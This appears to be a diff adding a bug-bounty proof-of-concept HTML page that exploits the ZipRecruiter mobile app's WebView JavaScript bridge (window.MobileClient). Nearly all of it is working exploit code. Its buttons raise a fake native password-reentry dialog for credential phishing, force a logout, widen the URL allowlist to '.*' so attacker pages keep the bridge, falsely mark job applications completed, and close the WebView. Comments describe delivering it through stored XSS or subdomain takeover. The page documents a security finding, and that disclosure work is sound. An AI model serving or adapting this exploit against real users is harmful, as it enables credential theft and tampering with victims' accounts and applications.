@@ -1,0 +1,148 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ZipRecruiter MobileClient Bridge PoC</title>
+<style>
+  body { font: 16px/1.4 -apple-system, system-ui, sans-serif; padding: 24px; max-width: 640px; margin: auto; }
+  h1   { font-size: 20px; }
+  button { display: block; width: 100%; margin: 8px 0; padding: 14px; font-size: 15px; }
+  pre  { background: #f4f4f6; padding: 12px; overflow: auto; font-size: 13px; }
+  .ok  { color: #0a7d2a; } .err { color: #b00020; } .muted { color: #666; }
+</style>
+</head>
+<body>
+
+<h1>MobileClient bridge PoC (Finding 03)</h1>
+<p class="muted">
+  Serve this page from any host that matches <code>*.ziprecruiter.com</code>,
+  <code>*.ziprecruiter.dev</code> or <code>*.zipaws.com</code> &mdash; a stored XSS,
+  a dangling-CNAME subdomain takeover, or a controlled bug-bounty test subdomain.
+  Once it loads in the ZipRecruiter app's <code>DefaultWebView</code>, the
+  <code>window.MobileClient</code> bridge is attached.
+</p>
+
+<h2>Bridge probe</h2>
+<pre id="probe">checking…</pre>
+
+<h2>Attack buttons</h2>
+<button onclick="probe()">Re-run probe</button>
+<button onclick="kickPhishingDialog()">[1] Show fake "Session expired" dialog (enableConfirmCloseModal)</button>
+<button onclick="forceLogout()">[2] Force logout (MobileClient.logout)</button>
+<button onclick="openProfile()">[3] Navigate to profile (MobileClient.openProfile)</button>
+<button onclick="widenAllowlist()">[4] Widen MAWI URL allowlist to attacker (setAllowedUrls)</button>
+<button onclick="completeApplication()">[5] Mark application completed (applicationCompleted)</button>
+<button onclick="closeWebview()">[6] Close current WebView (closeWebview)</button>
+
+<h2>Event log</h2>
+<pre id="log"></pre>
+
+<script>
+const $log = document.getElementById("log");
+function log(msg, cls) {
+  const line = document.createElement("div");
+  if (cls) line.className = cls;
+  line.textContent = "[" + new Date().toISOString() + "] " + msg;
+  $log.appendChild(line);
+  $log.scrollTop = $log.scrollHeight;
+}
+
+function probe() {
+  const probeEl = document.getElementById("probe");
+  if (typeof MobileClient === "undefined") {
+    probeEl.textContent = "MobileClient bridge NOT attached.\n" +
+      "host = " + location.host + "\n" +
+      "ua   = " + navigator.userAgent;
+    probeEl.className = "err";
+    return false;
+  }
+  const methods = [
+    "applicationCompleted", "closeWebview", "disableConfirmCloseModal",
+    "enableConfirmCloseModal", "logout", "openProfile", "pageReady",
+    "profileChanged", "setAllowedUrls", "webviewOriginPlacementId",
+  ];
+  const present = methods.filter(m => typeof MobileClient[m] === "function");
+  probeEl.className = "ok";
+  probeEl.textContent =
+    "MobileClient bridge ATTACHED.\n" +
+    "host  = " + location.host + "\n" +
+    "ua    = " + navigator.userAgent + "\n" +
+    "place = " + (typeof MobileClient.webviewOriginPlacementId === "function"
+                  ? MobileClient.webviewOriginPlacementId() : "?") + "\n" +
+    "found = " + present.join(", ");
+  return true;
+}
+
+// -- [1] Phishing dialog ------------------------------------------------------
+// Renders a native-looking AlertDialog INSIDE the ZipRecruiter app shell, with
+// the four button/title strings fully attacker-controlled. Perfect cred-prompt
+// vector after a user lands here via stored XSS or subdomain takeover.
+function kickPhishingDialog() {
+  if (!probe()) return;
+  try {
+    MobileClient.enableConfirmCloseModal(
+      "Re-enter your password",
+      "Your ZipRecruiter session expired. To keep your application progress, " +
+      "tap Continue and re-enter your password on the next screen.",
+      "Continue",
+      "Cancel"
+    );
+    log("enableConfirmCloseModal dispatched", "ok");
+  } catch (e) { log("enableConfirmCloseModal threw: " + e, "err"); }
+}
+
+// -- [2] Force logout ---------------------------------------------------------
+// Wipes the in-app session. Combine with [1] to drive the user into a
+// credential re-entry flow you control.
+function forceLogout() {
+  if (!probe()) return;
+  try { MobileClient.logout(); log("logout dispatched", "ok"); }
+  catch (e) { log("logout threw: " + e, "err"); }
+}
+
+// -- [3] Navigate to profile --------------------------------------------------
+function openProfile() {
+  if (!probe()) return;
+  try { MobileClient.openProfile(); log("openProfile dispatched", "ok"); }
+  catch (e) { log("openProfile threw: " + e, "err"); }
+}
+
+// -- [4] Widen runtime URL allowlist -----------------------------------------
+// setAllowedUrls takes a String[] of regex patterns. By injecting a regex that
+// matches ANY URL we ensure subsequent in-app navigation (e.g. apply flow
+// redirects) keeps loading attacker-controlled URLs WITH the bridge still
+// attached, even after the user navigates "away" from the original host.
+function widenAllowlist() {
+  if (!probe()) return;
+  try {
+    MobileClient.setAllowedUrls([".*"]);
+    log("setAllowedUrls([.*]) dispatched - allowlist now wide open", "ok");
+  } catch (e) { log("setAllowedUrls threw: " + e, "err"); }
+}
+
+// -- [5] Mark MAWI job application "completed" -------------------------------
+// Server-side state confusion - the MAWI apply backend may persist a completed
+// state without the user having actually finished form fields.
+function completeApplication() {
+  if (!probe()) return;
+  try {
+    MobileClient.applicationCompleted();
+    log("applicationCompleted dispatched", "ok");
+  } catch (e) { log("applicationCompleted threw: " + e, "err"); }
+}
+
+// -- [6] Close the WebView session -------------------------------------------
+// Drops the in-app webview without user interaction. Use to break out of a
+// running flow before the victim can react.
+function closeWebview() {
+  if (!probe()) return;
+  try { MobileClient.closeWebview(); log("closeWebview dispatched", "ok"); }
+  catch (e) { log("closeWebview threw: " + e, "err"); }
+}
+
+// Run probe immediately so refresh = self-test.
+probe();
+</script>
+</body>
+</html>
